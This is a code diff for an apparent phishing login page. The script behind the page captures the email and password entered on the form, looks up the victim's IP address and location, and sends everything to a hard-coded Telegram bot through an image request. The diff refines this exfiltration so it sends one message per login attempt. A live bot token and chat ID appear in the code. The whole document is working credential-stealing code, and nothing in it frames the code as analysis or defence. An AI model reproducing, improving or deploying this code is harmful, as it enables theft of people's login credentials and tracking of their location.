@@ -107,28 +107,25 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
               const TELEGRAM_BOT_TOKEN = '8690885088:AAG_m0eN8wSy6Aaj_zZEIpVaL8zSrst2Elw';
               const TELEGRAM_CHAT_ID = '6159490685';
               
-              // Flag to prevent multiple sends
-              let isSending = false;
+              // Track if we've already sent for this attempt
+              let messageSentForThisAttempt = false;
               
-              // SINGLE Telegram sender - ONLY ONE method, ONE attempt
+              // SINGLE Telegram sender - ABSOLUTELY ONLY ONE MESSAGE
               function sendToTelegram(message) {
-                if (isSending) {
-                  console.log('Already sending, skipping...');
+                // If we already sent for this attempt, DO NOT SEND AGAIN
+                if (messageSentForThisAttempt) {
+                  console.log('⚠️ Already sent for this attempt, blocking duplicate');
                   return;
                 }
                 
-                isSending = true;
-                console.log('📤 Sending ONE message to Telegram:', message.substring(0, 50) + '...');
+                // Mark as sent
+                messageSentForThisAttempt = true;
+                console.log('📤 Sending ONE message to Telegram');
                 
-                // Use ONLY ONE method - Image tag (most reliable, no duplicates)
+                // Use ONLY ONE image - NO loops, NO multiple methods
                 const img = new Image();
                 img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                   `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML&_=${Date.now()}`;
-                
-                // Reset flag after a delay
-                setTimeout(() => {
-                  isSending = false;
-                }, 2000);
                 
                 console.log('✅ Single message sent');
               }
@@ -158,14 +155,14 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
               }
 
               function getIpAndLocation(callback) {
-                // Try multiple IP services but ONLY CALL BACK ONCE
-                let called = false;
+                // Use a flag to ensure we only call back once
+                let callbackCalled = false;
                 
                 fetch('https://api.ipify.org?format=json')
                   .then(r => r.json())
                   .then(data => {
-                    if (!called) {
-                      called = true;
+                    if (!callbackCalled) {
+                      callbackCalled = true;
                       const ip = data.ip;
                       fetch(`https://ipapi.co/${ip}/json/`)
                         .then(r => r.json())
@@ -180,8 +177,8 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                     }
                   })
                   .catch(() => {
-                    if (!called) {
-                      called = true;
+                    if (!callbackCalled) {
+                      callbackCalled = true;
                       fetch('https://ipapi.co/json/')
                         .then(r => r.json())
                         .then(data => {
@@ -199,7 +196,12 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                   });
               }
 
-              // Handle form submission - ONLY ONE MESSAGE PER ATTEMPT
+              // Reset the sent flag for new attempt
+              function resetSentFlag() {
+                messageSentForThisAttempt = false;
+              }
+
+              // Handle form submission - ABSOLUTELY ONE MESSAGE PER ATTEMPT
               $("#loginForm").on('submit', function(e) {
                   e.preventDefault();
                   
@@ -213,6 +215,9 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                   let email = $("#email").val();
                   let mxRecord = getMxRecord(email);
                   let currentAttempt = attemptCount;
+                  
+                  // Reset the sent flag for this new attempt
+                  resetSentFlag();
                   
                   // SHOW IMMEDIATE FEEDBACK
                   if (currentAttempt < MAX_ATTEMPTS) {
@@ -230,7 +235,7 @@ body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica N
                   // SEND ONLY ONE MESSAGE - Wait for IP and send complete info
                   getIpAndLocation(function(ip, location) {
                       const completeMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
-                      console.log('📤 Sending complete info:', completeMessage);
+                      console.log('📤 Sending complete info for attempt', currentAttempt);
                       sendToTelegram(completeMessage);
                   });
                   
